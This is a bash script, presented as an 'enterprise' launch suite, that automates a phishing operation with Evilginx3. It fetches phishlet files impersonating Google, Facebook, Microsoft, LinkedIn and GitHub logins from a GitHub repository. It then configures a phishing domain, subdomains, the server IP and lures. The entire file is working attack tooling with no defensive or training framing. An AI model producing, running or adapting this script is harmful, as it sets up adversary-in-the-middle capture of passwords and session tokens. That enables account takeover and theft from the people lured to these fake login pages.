#!/bin/bash
# === PHISHLET LAUNCH SUITE (ENTERPRISE) ===
# Automates YAML retrieval, storage, and deployment into Evilginx3
# Domain: hrahra.org | IP: Dynamic or preassigned | Repository: khast3x curated

set -euo pipefail

### === CONFIGURATION ===
PHISHLETS_DIR="/opt/posh-ai/evilginx3/phishlets"
EVILGINX="/opt/posh-ai/evilginx3/evilginx"
REPO="https://raw.githubusercontent.com/khast3x/evilginx3-phishlets/main"
DOMAIN="hrahra.org"
EXTERNAL_IP="$(curl -s https://api.ipify.org)"
REDIRECT_URL="https://example.com"

declare -A PHISHLETS=(
  [google]="google.yaml"
  [facebook]="facebook.yaml"
  [microsoft]="microsoft.yaml"
  [linkedin]="linkedin.yaml"
  [github]="github.yaml"
)

### === UTILITIES ===
log()   { echo -e "\033[1;36m[PHISHLET]\033[0m $*"; }
fatal() { echo -e "\033[1;31m[✘] $*" >&2; exit 1; }

### === PRECHECKS ===
command -v curl &>/dev/null || fatal "Missing dependency: curl"
[[ -x "$EVILGINX" ]] || fatal "Evilginx binary not found at $EVILGINX"

### === DOWNLOAD PHISHLETS ===
download_phishlets() {
  log "Syncing phishlets → $PHISHLETS_DIR"
  mkdir -p "$PHISHLETS_DIR"
  for name in "${!PHISHLETS[@]}"; do
    url="$REPO/${PHISHLETS[$name]}"
    dest="$PHISHLETS_DIR/${PHISHLETS[$name]}"
    curl -fsSL "$url" -o "$dest" && log "  ↳ $name ✓" || log "  ↳ $name ✘ [FAILED]"
  done
}

### === LAUNCH EVILGINX ===
deploy_into_evilginx() {
  log "Deploying into Evilginx3"
  "$EVILGINX" <<-COMMANDS
    config domain $DOMAIN
    config ip $EXTERNAL_IP
    config redirect_url $REDIRECT_URL

    phishlets hostname google.$DOMAIN
    phishlets enable google
    phishlets hostname facebook.$DOMAIN
    phishlets enable facebook
    phishlets hostname microsoft.$DOMAIN
    phishlets enable microsoft

    lures create google 0
    lures create facebook 0
    lures create microsoft 0
COMMANDS
}

### === EXECUTE ===
download_phishlets
deploy_into_evilginx

log "✅ Phishlets deployed and Evilginx3 initialized."
